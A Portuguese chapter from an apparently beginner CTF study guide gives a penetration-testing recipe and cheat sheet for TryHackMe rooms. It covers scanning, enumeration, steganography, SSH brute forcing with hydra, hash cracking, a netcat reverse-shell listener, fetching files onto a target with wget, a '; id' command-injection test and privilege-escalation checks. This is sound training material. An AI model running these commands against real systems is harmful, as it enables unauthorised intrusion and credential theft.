# 5. Metodologia e cola

[⬅ Primeiras invasões guiadas](04-primeiras-invasoes-guiadas.md) · [Sumário](README.md) · [Próximo: Trilha dos 30 CTFs ➡](06-trilha-30-ctfs.md)

Deixe este arquivo aberto do lado enquanto faz os CTFs da Fase 6.

## 🍳 A receita de quase todo CTF iniciante

### 1. Reconhecimento

```bash
nmap -sC -sV <IP>
nmap -p- --min-rate 1000 <IP>
```

Anote cada porta aberta e a versão do serviço. Pergunte-se: **qual destas portas é a entrada?** Na dúvida, comece pelo site (80, 8080, 443).

### 2. Enumeração (olhar tudo com calma)

**Se tiver site:**

- [ ] Abrir no Firefox do Kali e clicar em tudo.
- [ ] `Ctrl+U`: ler o código-fonte procurando comentários, nomes, senhas e links.
- [ ] Abrir `/robots.txt` e `/sitemap.xml`.
- [ ] Rodar o Gobuster (e de novo dentro de cada pasta achada).
- [ ] Anotar o nome e a versão do sistema do site (WordPress, CMS Made Simple...) e procurar no `searchsploit`.
- [ ] Testar se login aceita senhas padrão (`admin:admin`, `admin:password`).

**Se tiver FTP (21):**

```bash
ftp <IP>          # usuário: anonymous, senha: em branco
```

Use `ls -la` e `get arquivo` lá dentro.

**Se tiver SMB (139/445):**

```bash
smbclient -L //<IP>/ -N          # lista os compartilhamentos sem senha
smbclient //<IP>/nome -N         # entra em um deles
enum4linux -a <IP>               # tenta descobrir usuários
```

**Achou imagem, áudio ou arquivo estranho?**

```bash
file arquivo                     # o que esse arquivo realmente é?
strings arquivo | less           # textos escondidos dentro dele
exiftool imagem.jpg              # metadados (autor, comentário, GPS)
steghide extract -sf imagem.jpg  # dados escondidos (pede senha, tente em branco)
stegseek imagem.jpg /usr/share/wordlists/rockyou.txt   # descobre a senha do steghide
binwalk -e arquivo               # arquivos escondidos dentro de outro
hexedit arquivo                  # ver/editar os bytes (consertar cabeçalho de imagem corrompida)
```

**Áudio estranho (chiado, bipes)?** Abra no `sonic-visualiser` (pelo `kex --win -s`) e use *Layer → Add Spectrogram*. Às vezes o texto aparece desenhado no gráfico.

**Arquivo `.pcap` (tráfego de rede gravado)?** Abra no `wireshark` (pelo `kex --win -s`) e use *Analyze → Follow → TCP Stream* para ler as conversas.

**Achou texto esquisito tipo `SGVsbG8=` ou `01001000`?** Cole no [CyberChef](https://gchq.github.io/CyberChef/) e use a receita **Magic**: ele tenta descobrir a codificação sozinho.

### 3. Acesso inicial

Os caminhos mais comuns em CTF fácil:

- Credenciais achadas → SSH (`ssh usuario@<IP>`).
- Página de upload → mandar um shell reverso em PHP.
- Campo que roda comando (ping, busca) → injeção de comando (`; id`).
- Versão vulnerável → `searchsploit` → exploit.
- Chave SSH (`id_rsa`) achada → `chmod 600 id_rsa` e `ssh -i id_rsa usuario@<IP>`.

### 4. Escalação de privilégio

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /home/*  /opt  /var/backups
```

Qualquer programa estranho → [GTFOBins](https://gtfobins.github.io). Nada óbvio → linpeas (veja o [arquivo 3](03-ferramentas.md#8-escalação-de-privilégio-virar-root)).

### Onde costumam estar as flags

```bash
cat /home/*/user.txt
cat /root/root.txt
find / -name "*.txt" -path "*flag*" 2>/dev/null
```

## 📋 Cola rápida de comandos

| Quero... | Comando |
|----------|---------|
| Ligar a VPN | `~/ctf_learnig/vpn.sh start` |
| Ver se a VPN está funcionando | `~/ctf_learnig/vpn.sh test` |
| Ver se o alvo está no ar | `ping -c 4 <IP>` ou `~/ctf_learnig/vpn.sh test <IP>` |
| Desligar a VPN | `~/ctf_learnig/vpn.sh stop` |
| Ver portas abertas | `nmap -sC -sV <IP>` |
| Ver todas as portas | `nmap -p- --min-rate 1000 <IP>` |
| Achar pastas no site | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` |
| Achar pastas (lista grande) | `gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html` |
| Força bruta no SSH | `hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<IP>` |
| Quebrar hash | `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
| Esperar shell reverso | `nc -lvnp 4444` |
| Servir arquivos para o alvo | `python3 -m http.server 8000` |
| Baixar arquivo no alvo | `wget http://<MEU_IP>:8000/arquivo` |
| Ver meu IP na VPN | `ip a show tun0` |
| Procurar exploit | `searchsploit <programa> <versão>` |
| Adicionar nome ao hosts | `echo "<IP> nome.thm" \| sudo tee -a /etc/hosts` |

## 🧠 Regras de ouro para não travar

1. **Regra dos 30 minutos.** Travou no mesmo passo por mais de meia hora? Procure um writeup da sala (pesquise "nome da sala tryhackme writeup"), leia **apenas** a dica do ponto onde você parou, feche a aba e continue sozinho. Ler o writeup inteiro de uma vez é jogar o aprendizado fora.
2. **Anote tudo.** Cada porta, pasta, nome de usuário, senha e ideia que não deu certo. A resposta muitas vezes já está nas suas notas.
3. **Enumere mais.** Em 90% dos travamentos a resposta é: você não olhou tudo. Rodou o `nmap -p-`? Rodou o Gobuster dentro das pastas? Leu o código-fonte de **todas** as páginas?
4. **Leia a pergunta da sala.** As perguntas do TryHackMe são dicas disfarçadas. "Qual o nome do arquivo escondido?" significa que existe um arquivo escondido.
5. **Nomes são pistas.** O nome da sala, o tema e a descrição quase sempre apontam para a falha.
6. **Depois de terminar, leia um writeup.** Mesmo tendo conseguido. Você vai descobrir caminhos mais rápidos e técnicas novas.
7. **Reiniciou a máquina? O IP mudou.** Atualize o `/etc/hosts` e suas anotações.

## 📝 Modelo de anotações por sala

Crie um arquivo por máquina em `~/ctf_learnig/notas/nome-da-sala.md` e copie isto:

```markdown
# Nome da Sala:
- **Data:**
- **IP do Alvo:**
- **Meu IP (tun0):**

## Portas Abertas (Nmap)
-

## Páginas / Pastas Encontradas
-

## Usuários / Senhas / Pistas
-

## O que tentei e não funcionou
-

## Como entrei (acesso inicial)
-

## Como virei root
-

## Flags
- User:
- Root:

## O que aprendi de novo
-
```

As seções **"O que tentei e não funcionou"** e **"O que aprendi de novo"** são as que mais te fazem evoluir. Não pule.

[⬅ Primeiras invasões guiadas](04-primeiras-invasoes-guiadas.md) · [Sumário](README.md) · [Próximo: Trilha dos 30 CTFs ➡](06-trilha-30-ctfs.md)
